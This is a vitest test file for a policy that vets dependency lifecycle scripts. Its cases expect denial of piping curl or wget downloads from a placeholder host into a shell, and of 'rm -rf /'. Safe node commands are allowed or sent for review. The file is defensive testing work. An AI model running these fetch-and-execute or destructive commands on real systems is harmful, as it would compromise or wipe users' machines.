import { describe, it, expect } from "vitest";
import { evaluateScriptPolicy, DEFAULT_POLICY } from "../src/scripts";

describe("lifecycle script policy", () => {
  it("denies curl | sh regardless of phase", () => {
    const r = evaluateScriptPolicy({
      dependency: "evil-pkg",
      phase: "postinstall",
      command: "curl -fsSL https://x.example/install.sh | sh",
    });
    expect(r.decision).toBe("deny");
  });

  it("denies wget | sh", () => {
    const r = evaluateScriptPolicy({ dependency: "x", phase: "postinstall", command: "wget -qO- https://x.example/i.sh | bash" });
    expect(r.decision).toBe("deny");
  });

  it("denies rm -rf /", () => {
    const r = evaluateScriptPolicy({ dependency: "x", phase: "preinstall", command: "rm -rf /" });
    expect(r.decision).toBe("deny");
  });

  it("default-denies when phase is not in defaultAllow", () => {
    const r = evaluateScriptPolicy({
      dependency: "left-pad",
      phase: "postinstall",
      command: "node ./build.js",
    });
    expect(r.decision).toBe("require-review");
  });

  it("allows node script.js when phase is allow-listed", () => {
    const policy = { ...DEFAULT_POLICY, defaultAllow: ["postinstall" as const] };
    const r = evaluateScriptPolicy({ dependency: "x", phase: "postinstall", command: "node ./build.js" }, policy);
    expect(r.decision).toBe("allow");
  });

  it("requires review for arbitrary shell commands", () => {
    const policy = { ...DEFAULT_POLICY, defaultAllow: ["postinstall" as const] };
    const r = evaluateScriptPolicy({ dependency: "x", phase: "postinstall", command: "echo hi" }, policy);
    expect(r.decision).toBe("require-review");
  });
});
